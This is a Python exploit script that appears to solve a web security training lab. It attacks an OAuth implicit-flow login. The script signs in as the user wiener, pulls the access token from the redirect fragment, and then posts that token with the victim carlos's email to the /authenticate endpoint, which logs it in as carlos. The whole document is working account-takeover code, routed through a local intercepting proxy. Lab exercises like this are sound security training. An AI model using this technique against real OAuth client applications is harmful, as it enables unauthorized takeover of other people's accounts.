#!/usr/bin/env python3

import requests
import html
import re
import sys
import time
import urllib3
from urllib.parse import urlparse, parse_qs

from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

CARLOS_EMAIL = "carlos@carlos-montoya.net"
WIENER_USER = "wiener"
WIENER_PASS = "peter"

OAUTH_URL_RE = re.compile(r"https://oauth-[a-z0-9]+\.oauth-server\.net/auth\?[^\"'<>\s]+")


def get_oauth_link(s, url):
    r = s.get(f"{url}/my-account", verify=False, proxies=proxies, timeout=10)
    body = html.unescape(r.text)

    match = OAUTH_URL_RE.search(body)
    if match:
        return match.group(0)

    soup = BeautifulSoup(body, "html.parser")
    link = soup.find("a", href=re.compile(r"oauth-server\.net/auth"))
    if link:
        return link["href"]

    print("[-] Could not locate OAuth link. First 500 chars of /my-account:")
    print(body[:500])
    return None


def get_access_token(s, oauth_link):
    r = s.get(oauth_link, verify=False, proxies=proxies, timeout=10)
    interaction_url = r.url  # .../interaction/<id>

    data = {"username": WIENER_USER, "password": WIENER_PASS}
    r = s.post(f"{interaction_url}/login", data=data,
               verify=False, proxies=proxies, timeout=10)
    if "/confirm" not in r.text:
        print("[-] Failed to reach confirmation page")
        return None
    print("[+] Confirmed OAuth access request")

    r = s.post(f"{interaction_url}/confirm", allow_redirects=False,
               verify=False, proxies=proxies, timeout=10)
    next_request = r.next
    if next_request is None:
        print("[-] /confirm did not return a redirect")
        return None

    r = s.send(next_request, allow_redirects=False,
               verify=False, proxies=proxies, timeout=10)
    next_request = r.next
    if next_request is None:
        print("[-] Second redirect hop missing")
        return None

    fragment = urlparse(next_request.url).fragment
    params = parse_qs(fragment)
    return params.get("access_token", [None])[0]


def authenticate_as_carlos(s, url, token):
    json_body = {"email": CARLOS_EMAIL, "username": WIENER_USER, "token": token}
    s.post(f"{url}/authenticate", json=json_body,
           verify=False, proxies=proxies, timeout=10)
    r = s.get(f"{url}/my-account", verify=False, proxies=proxies, timeout=10)
    return "Your username is: carlos" in r.text


def check_solved(s, url, retries=5, delay=1.5):
    for attempt in range(retries):
        r = s.get(f"{url}/", verify=False, proxies=proxies, timeout=10)
        if "Congratulations" in r.text:
            print("[+] Lab solved!")
            return True
        if attempt < retries - 1:
            time.sleep(delay)
    print("[-] Lab not solved yet")
    return False


def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    url = sys.argv[1].strip().rstrip("/")
    s = requests.Session()

    oauth_link = get_oauth_link(s, url)
    if not oauth_link:
        print("[-] Failed to find social media login link on /my-account")
        return False
    print(f"[+] Found OAuth link: {oauth_link}")

    token = get_access_token(s, oauth_link)
    if not token:
        print("[-] Failed to obtain access token")
        return False
    print(f"[+] Got access token: {token}")

    if not authenticate_as_carlos(s, url, token):
        print("[-] /authenticate did not return carlos's account")
        return False
    print("[+] Authenticated as carlos")

    check_solved(s, url)


if __name__ == "__main__":
    main()